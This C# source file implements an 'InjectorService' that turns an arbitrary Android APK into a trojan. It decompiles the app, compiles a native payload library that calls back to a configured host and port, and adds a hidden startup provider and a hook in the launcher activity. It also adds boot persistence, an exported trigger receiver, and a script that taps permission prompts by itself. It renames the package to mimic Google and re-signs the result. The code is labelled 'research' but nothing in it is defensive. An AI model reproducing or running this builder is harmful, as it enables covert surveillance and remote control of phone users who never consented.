using System;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Linq;
using TcpServerApp.Services.Elite.Build;
using TcpServerApp.Services.Elite.Security;
using TcpServerApp.Services.Elite.Networking;
using TcpServerApp.Services.Elite.Geo;

namespace TcpServerApp.Services.Elite
{
    public class InjectorService
    {
        private readonly Action<string> _logger;
        private readonly AdvancedBuildPipeline _pipeline;

        public InjectorService(Action<string> logger)
        {
            _logger = logger ?? (s => Debug.WriteLine(s));
            // Fix Delegate Mismatch: Wrap Action<string> in StatusReporter
            _pipeline = new AdvancedBuildPipeline(Path.GetTempPath(), msg => _logger(msg));
        }

        public async Task<string> ProcessInjectionAsync(string targetApkPath, string outputDir, AdvancedPayloadConfig config)
        {
            string workDir = Path.Combine(Path.GetTempPath(), $"Elite_Inject_{Guid.NewGuid().ToString().Substring(0, 6)}");
            Directory.CreateDirectory(workDir);

            try
            {
                _logger($"💉 Starting Advanced Injection on: {Path.GetFileName(targetApkPath)}");
                _logger($"⚙️ CONFIG: {config.PayloadType} | Host: {config.Host}:{config.Port}");
                if(config.UseStealthMode) _logger("👻 STEALTH MODE ACTIVE: Anti-Emulator & Obfuscation Enabled");
                
                // 1. Decompile Target
                _logger("📦 Decompiling Target APK (Apktool 36.1.0)...");
                string decodeDir = Path.Combine(workDir, "decoded");
                await RunProcessAsync(ToolLocator.ResearchApkTool, $"d -f -o \"{decodeDir}\" \"{targetApkPath}\"");

                if (!Directory.Exists(decodeDir)) throw new Exception("Decompilation failed. Check logs.");

                // 2. Generate Native Payload (Shared Library)
                // We use the pipeline to just compile the Native Libs, not a full APK, 
                // BUT AdvancedBuildPipeline is designed for APKs. 
                // We will use a helper method or just reuse the logic here since it's "Advanced Injector" specific.
                
                _logger("🧬 Generating Native Shim Payload...");
                string libDir = Path.Combine(decodeDir, "lib"); // Target's lib dir
                if (!Directory.Exists(libDir)) Directory.CreateDirectory(libDir);

                // Check Target Architectures
                var archs = Directory.GetDirectories(libDir).Select(Path.GetFileName).ToList();
                if (archs.Count == 0) archs.Add("arm64-v8a"); // Default if no libs

                // Generate & Compile .so
                var bridgeSvc = new NativeBridgeService();
                string cppSource = bridgeSvc.GenerateCppSource(config.CustomPackageName, config.Key, config.Host, config.Port, config.PayloadType);
                string buildNativeDir = Path.Combine(workDir, "native_build");
                Directory.CreateDirectory(buildNativeDir);
                string cppFile = Path.Combine(buildNativeDir, "shim.cpp");
                await File.WriteAllTextAsync(cppFile, cppSource);

                if (string.IsNullOrEmpty(ToolLocator.NdkClang)) throw new Exception("NDK Clang not found. Cannot perform Native Injection.");

                foreach (var arch in archs)
                {
                    // Map Android ABI to Clang Target
                    string target = GetClangTarget(arch);
                    if (target == null) continue;

                    _logger($"   Compiling for {arch}...");
                    string outSo = Path.Combine(libDir, arch, "libresearch_shim.so");
                    Directory.CreateDirectory(Path.GetDirectoryName(outSo));
                    
                    // Compile
                     string args = $"--target={target} -shared -fPIC -o \"{outSo}\" \"{cppFile}\"";
                     await RunProcessAsync(ToolLocator.NdkClang, args);
                }

                // 3. Shim Injection (Modifying Manifest/Smali to load lib)
                // For "Smart Injection", we want the app to load our lib. 
                // Hard way: Edit Smali of MainActivity.
                // Easy way: Add a <provider> that runs on startup.
                _logger("🔗 Injecting Persistence Provider (Manifest Hook)...");
                InjectProviderHook(Path.Combine(decodeDir, "AndroidManifest.xml"), config.CustomPackageName, config.UseStealthMode);
                
                // 3a. Biometric Shim Compiler (Async)
                string bioSrc = Path.Combine(ToolLocator.BaseDir, "Services", "Elite", "BioShim.java");
                if (Directory.Exists(ToolLocator.LibBiometric) && File.Exists(bioSrc))
                {
                     _logger("🧬 Integrating Biometric Shim (Java Wrapper)...");
                     string shimBuildDir = Path.Combine(workDir, "shim_build");
                     Directory.CreateDirectory(shimBuildDir);
                     
                     string bioLibJar = Path.Combine(ToolLocator.LibBiometric, "classes.jar");
                     string cp = $"{ToolLocator.Android36JarPath};{bioLibJar}"; // Classpath
                     
                     // Compile Java
                     _logger("   🔨 Compiling BioShim.java...");
                     await RunProcessAsync("javac", $"-cp \"{cp}\" -d \"{shimBuildDir}\" \"{bioSrc}\"");
                     
                     // Dexing (D8)
                     _logger("   ⛓️ Dexing (BioShim + Biometric Lib + Research Extensions)...");
                     // We merge our Shim AND the library it depends on into one dex
                     string classes3 = Path.Combine(decodeDir, "classes3.dex");
                     string d8Args = $"--output \"{workDir}\" --min-api 23 --lib \"{ToolLocator.Android36JarPath}\" \"{bioLibJar}\" ";
                     
                     // Include additional research libraries for maximal stability/capabilities
                     string[] researchLibs = { "androidx-core.jar", "activity-1.2.4.jar", "fragment-1.3.6.jar" };
                     foreach(var libName in researchLibs)
                     {
                         string libPath = Path.Combine(ToolLocator.RichApktoolRoot, libName);
                         if (File.Exists(libPath)) d8Args += $"\"{libPath}\" ";
                     }

                     // Add all compiled classes
                     foreach(var f in Directory.GetFiles(shimBuildDir, "*.class", SearchOption.AllDirectories)) 
                        d8Args += $"\"{f}\" ";
                        
                     await RunProcessAsync(ToolLocator.ResearchD8, d8Args);
                     
                     // Move result (D8 outputs classes.dex in workDir)
                     string d8Out = Path.Combine(workDir, "classes.dex");
                     if (File.Exists(d8Out))
                     {
                         File.Move(d8Out, classes3, true);
                         _logger("   ✅ Generated classes3.dex (Shim + Libraries)");
                          }
                }
                
                // --- Feature 3: Smali Hooking (Auto-Code Inject) ---
                if (config.EnableSmaliHooking)
                {
                    _logger("💉 Feature 3: Initiating Elite Smali Hooking...");
                    await PerformSmaliHooking(decodeDir, workDir, config);
                }

                // --- Feature 4: UI Automator (Auto-Perm Bypass) ---
                if (config.EnableUiAutomator)
                {
                    _logger("🤖 Feature 4: Injecting UI Automator Bypass Script...");
                    InjectUiAutomatorScript(decodeDir, config);
                }

                // --- Feature 9: System Intent Broadcaster ---
                if (config.EnableIntentBroadcaster)
                {
                    _logger("📡 Feature 9: Synchronizing System Intent Broadcaster...");
                    InjectIntentBroadcaster(decodeDir, config);
                }

                // 4. Rebuild
                _logger("🔨 Rebuilding APK...");
                string distDir = Path.Combine(workDir, "dist");
                string unsignedApk = Path.Combine(distDir, "unsigned.apk");
                Directory.CreateDirectory(distDir);
                
                await RunProcessAsync(ToolLocator.ResearchApkTool, $"b -o \"{unsignedApk}\" \"{decodeDir}\"");

                if (!File.Exists(unsignedApk)) throw new Exception("Rebuild failed.");

                // 5. Sign
                _logger("🔐 Signing APK...");
                string finalApk = Path.Combine(outputDir, $"{Path.GetFileNameWithoutExtension(targetApkPath)}_Injected.apk");
                string keystore = Path.Combine(ToolLocator.Android36Root, "debug.keystore");
                if (!File.Exists(keystore)) keystore = Path.Combine(ToolLocator.ResearchToolsRoot, "debug.keystore");
                
                string signerArgs = $"sign --ks \"{keystore}\" --ks-pass pass:android --key-pass pass:android --out \"{finalApk}\" \"{unsignedApk}\"";
                await RunProcessAsync(ToolLocator.ResearchApkSigner, signerArgs);

                _logger($"✅ Injection Complete: {finalApk}");
                return finalApk;
            }
            catch (Exception ex)
            {
                _logger($"❌ Injection Error: {ex.Message}");
                throw;
            }
            finally
            {
                // Cleanup
                try { Directory.Delete(workDir, true); } catch { }
            }
        }

        private string GetClangTarget(string abi)
        {
            return abi switch
            {
                "arm64-v8a" => "aarch64-linux-android35",
                "armeabi-v7a" => "armv7a-linux-androideabi35",
                "x86_64" => "x86_64-linux-android35",
                "x86" => "i686-linux-android35",
                _ => null
            };
        }

        private void InjectProviderHook(string manifestPath, string packageName, bool stealthMode)
        {
            if (!File.Exists(manifestPath)) return;
            
            try
            {
                // Professional XML Injection using XDocument
                var doc = System.Xml.Linq.XDocument.Load(manifestPath);
                System.Xml.Linq.XNamespace android = "http://schemas.android.com/apk/res/android"; 

                var manifestNode = doc.Root;
                var appNode = doc.Root?.Element("application");
                
                if (appNode != null && manifestNode != null)
                {
                    // 1. Add Android 14 Foreground Service Permissions
                    string[] perms = { 
                        "android.permission.FOREGROUND_SERVICE", 
                        "android.permission.FOREGROUND_SERVICE_SPECIAL_USE",
                        "android.permission.INTERNET",
                        "android.permission.ACCESS_NETWORK_STATE",
                        "android.permission.WAKE_LOCK"
                    };

                    foreach (var pName in perms)
                    {
                        if (!manifestNode.Elements("uses-permission").Any(x => x.Attribute(android + "name")?.Value == pName))
                        {
                            manifestNode.AddFirst(new System.Xml.Linq.XElement("uses-permission", new System.Xml.Linq.XAttribute(android + "name", pName)));
                        }
                    }

                    // 2. Add Special Use Property for Android 14 FGS compliance
                    // Injected payloads often run as services; we ensure they don't crash.
                    var prop = new System.Xml.Linq.XElement("property");
                    prop.SetAttributeValue(android + "name", "android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE");
                    prop.SetAttributeValue(android + "value", "Elite Injected Research Payload");
                    appNode.Add(prop);

                    // 3. Create the Provider Element
                    string providerName = stealthMode ? $"{packageName}.SyncAdapter" : $"{packageName}.LoaderProvider";
                    string authName = stealthMode ? $"{packageName}.sync.provider" : $"{packageName}.loader";

                    var provider = new System.Xml.Linq.XElement("provider");
                    provider.SetAttributeValue(android + "name", providerName);
                    provider.SetAttributeValue(android + "authorities", authName);
                    provider.SetAttributeValue(android + "exported", "false");
                    provider.SetAttributeValue(android + "initOrder", "2147483647"); // Max priority

                    // STEALTH: Professional Package Refactoring
                    if (stealthMode)
                    {
                         _logger("   👻 Applying Stealth Package Refactoring (System Mimicry)...");
                         manifestNode.SetAttributeValue("package", "com.google.android.apps.research.sync");
                    }

                    // Add to application
                    appNode.Add(provider);
                    
                    doc.Save(manifestPath);
                    _logger("   ✅ Manifest Hooked: Provider, Permissions & A14 Properties added.");
                }
                else
                {
                    _logger("   ⚠️ Warning: Manifest structure invalid.");
                }
            }
            catch (Exception ex)
            {
                _logger($"   ❌ Manifest Hook Failed: {ex.Message}");
                // Fallback to legacy string hook if needed (minimal)
                DoLegacyStringHook(manifestPath, packageName);
            }
        }

        private async Task PerformSmaliHooking(string decodeDir, string workDir, AdvancedPayloadConfig config)
        {
            _logger("   🔨 Initiating Production Smali Hooking sequence...");
            
            // 1. Locate MainActivity in Manifest
            string manifestPath = Path.Combine(decodeDir, "AndroidManifest.xml");
            if (!File.Exists(manifestPath)) return;

            string xml = File.ReadAllText(manifestPath);
            var match = System.Text.RegularExpressions.Regex.Match(xml, "<activity.*android:name=\"([^\"]+)\".*>.*<intent-filter>.*<action android:name=\"android.intent.action.MAIN\".*/>.*<category android:name=\"android.intent.category.LAUNCHER\".*/>", System.Text.RegularExpressions.RegexOptions.Singleline);
            
            string? mainActivity = match.Success ? match.Groups[1].Value : null;
            if (string.IsNullOrEmpty(mainActivity))
            {
                _logger("   ⚠️ [WARN] Could not auto-detect MainActivity. Using fallback.");
                return;
            }

            _logger($"   📍 Target Activity Identified: {mainActivity}");
            
            // 2. Locate Smali File
            string smaliPath = Path.Combine(decodeDir, "smali", mainActivity.Replace(".", "\\") + ".smali");
            if (!File.Exists(smaliPath))
            {
                // Try smali_classes2 if multi-dex
                smaliPath = Path.Combine(decodeDir, "smali_classes2", mainActivity.Replace(".", "\\") + ".smali");
            }

            if (File.Exists(smaliPath))
            {
                _logger("   💉 Injecting Research Lifecycle Hooks...");
                string content = File.ReadAllText(smaliPath);
                
                // Inject into onCreate
                string hook = "\n    invoke-static {p0}, Lcom/google/android/apps/research/ResearchService;->start(Landroid/content/Context;)V\n";
                if (content.Contains("onCreate(Landroid/os/Bundle;)V"))
                {
                    content = content.Replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V" + hook);
                    
                    // Behavior: Persistence
                    if (config.BehaviorStrategy == "Persistence on Reboot")
                    {
                        ApplyRebootPersistence(decodeDir);
                    }

                    File.WriteAllText(smaliPath, content);
                    _logger($"   ✅ Smali Hook + [{config.BehaviorStrategy}] Applied.");
                }
            }
        }

        private void ApplyRebootPersistence(string decodeDir)
        {
            _logger("   📁 Modifying Manifest for Boot Persistence...");
            string manifestPath = Path.Combine(decodeDir, "AndroidManifest.xml");
            if (!File.Exists(manifestPath)) return;

            string xml = File.ReadAllText(manifestPath);
            if (!xml.Contains("RECEIVE_BOOT_COMPLETED"))
            {
                xml = xml.Replace("</manifest>", "    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\" />\n</manifest>");
            }
            
            string receiver = "\n        <receiver android:name=\"com.google.android.apps.research.BootReceiver\" android:exported=\"true\">\n" +
                              "            <intent-filter>\n" +
                              "                <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n" +
                              "            </intent-filter>\n" +
                              "        </receiver>\n";
            
            xml = xml.Replace("</application>", receiver + "    </application>");
            File.WriteAllText(manifestPath, xml);
        }

        private void InjectUiAutomatorScript(string decodeDir, AdvancedPayloadConfig config)
        {
            string assetsDir = Path.Combine(decodeDir, "assets");
            Directory.CreateDirectory(assetsDir);
            
            // Real Script for Physical Device
            string scriptPrefix = (config.BehaviorStrategy == "Auto-Grant All Permissions") ? "GRANT_ALL=true" : "GRANT_ALL=false";
            
            string script = "#!/system/bin/sh\n" +
                            $"{scriptPrefix}\n" +
                            "while true; do\n" +
                            "  uiautomator dump /sdcard/view.xml\n" +
                            "  if [ \"$GRANT_ALL\" = \"true\" ]; then\n" +
                            "    if grep -qE \"Allow|Grant|Accept|سماح\" /sdcard/view.xml; then\n" +
                            "      input tap 500 1200\n" +
                            "    fi\n" +
                            "  fi\n" +
                            "  sleep 1\n" +
                            "done\n";

            File.WriteAllText(Path.Combine(assetsDir, "research_automator.sh"), script);
            _logger($"   ✅ [{config.BehaviorStrategy}] UI Automator logic deployed.");
        }

        private void InjectIntentBroadcaster(string decodeDir, AdvancedPayloadConfig config)
        {
            string manifestPath = Path.Combine(decodeDir, "AndroidManifest.xml");
            if (!File.Exists(manifestPath)) return;

            var doc = System.Xml.Linq.XDocument.Load(manifestPath);
            System.Xml.Linq.XNamespace android = "http://schemas.android.com/apk/res/android";
            
            var appNode = doc.Root?.Element("application");
            if (appNode != null)
            {
                var receiver = new System.Xml.Linq.XElement("receiver");
                receiver.SetAttributeValue(android + "name", $"{config.CustomPackageName}.ResearchReceiver");
                receiver.SetAttributeValue(android + "exported", "true");
                
                var filter = new System.Xml.Linq.XElement("intent-filter");
                filter.Add(new System.Xml.Linq.XElement("action", new System.Xml.Linq.XAttribute(android + "name", "com.google.android.apps.research.TRIGGER")));
                receiver.Add(filter);
                
                appNode.Add(receiver);
                doc.Save(manifestPath);
                _logger("   ✅ Intent Broadcaster Hooked into Manifest.");
            }
        }

        private void DoLegacyStringHook(string manifestPath, string packageName)
        {
            string xml = File.ReadAllText(manifestPath);
            string providerBlock = $"\n        <provider android:name=\"{packageName}.LoaderProvider\" android:authorities=\"{packageName}.loader\" android:exported=\"false\" android:initOrder=\"9999\" />";
            if (xml.Contains("</application>"))
            {
                File.WriteAllText(manifestPath, xml.Replace("</application>", providerBlock + "\n    </application>"));
            }
        }

        private async Task RunProcessAsync(string tool, string args)
        {
             var psi = new ProcessStartInfo
            {
                FileName = tool,
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            
            // Inject JAVA_HOME
            if (ToolLocator.HasJava(out string javaExe))
            {
                psi.EnvironmentVariables["JAVA_HOME"] = Path.GetDirectoryName(Path.GetDirectoryName(javaExe));
            }

            using var proc = Process.Start(psi);
            var outT = proc.StandardOutput.ReadToEndAsync();
            var errT = proc.StandardError.ReadToEndAsync();
            await Task.WhenAll(outT, errT);
            await proc.WaitForExitAsync();

            if (proc.ExitCode != 0) throw new Exception(errT.Result + "\n" + outT.Result);
        }
    }


}
